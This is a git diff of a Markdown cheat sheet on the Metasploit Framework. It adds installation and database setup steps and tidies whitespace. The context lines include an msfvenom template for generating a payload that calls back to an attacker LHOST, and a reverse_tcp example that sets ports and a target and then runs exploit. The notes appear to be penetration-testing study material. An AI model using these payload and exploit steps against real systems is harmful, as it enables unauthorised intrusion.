@@ -1,5 +1,28 @@
 # [metasploit framework](https://www.metasploit.com/)
 
+## install
+
+```bash
+kali:~ # apt install metasploit-framework
+
+# initial db
+# Metasploit 使用 PostgreSQL 作為後端資料庫，用來儲存掃描結果、主機資訊與憑證。如果沒有初始化，搜尋模組的速度會非常緩慢。
+kali:~ # systemctl start postgresql
+kali:~ # systemctl enable postgresql
+
+# initial MSF db
+kali:~ # msfdb init
+
+# launch metasploit console
+kali:~ # msfconsole [-q]
+
+# verify db status
+msf > db_status
+msf > quit
+
+kali:~ # ls /usr/share/metasploit-framework/modules/exploits
+```
+
 ## msfdb
 
 ```bash
@@ -15,7 +38,6 @@ kali:~ # msfdb run          # start db service
 kali:~ # cat /usr/share/metasploit-framework/config/database.yml
 ```
 
-
 ---
 
 ## msfvenom
@@ -26,7 +48,6 @@ kali:~ # msfvenom -l payloads|format|archs
 kali:~ # msfvenom -p <payload> LHOST=<kali ip> LPORT=<kali port> -f <format> -o <file>
 # LHOST: local host, LPORT: local port
 ```
-
 
 ---
 
@@ -46,21 +67,17 @@ msf6 > setg <VAR> <var>     # set global variable
 msf6 > getg <VAR> <var>     # get global variable
 ```
 
-
 ---
 
 ### core command
-
 
 ---
 
 ### module command
 
-
 ---
 
 ### job command
-
 
 ---
 
@@ -83,27 +100,23 @@ msf6 > resource <script>    # run command with file
 msf6 > makerc <script>      # save command with file
 ```
 
-
 ---
 
 ### database backend command
-
 
 ---
 
 ## credentials backend command
 
-
 ---
 
 ## developer
-
 
 ---
 
 ## example
 
-###  network topology
+### network topology
 
 ```
 kali           target machine
@@ -112,7 +125,6 @@ kali           target machine
    |              |
    +--------------+...
 ```
-
 
 ### reverse_tcp / reverse_http / reverse_https / bind_tcp
 
@@ -146,7 +158,6 @@ msf6 > set lport 31337
 msf6 > set rhost 192.168.0.20
 msf6 > exploit
 ```
-
 
 ---
 
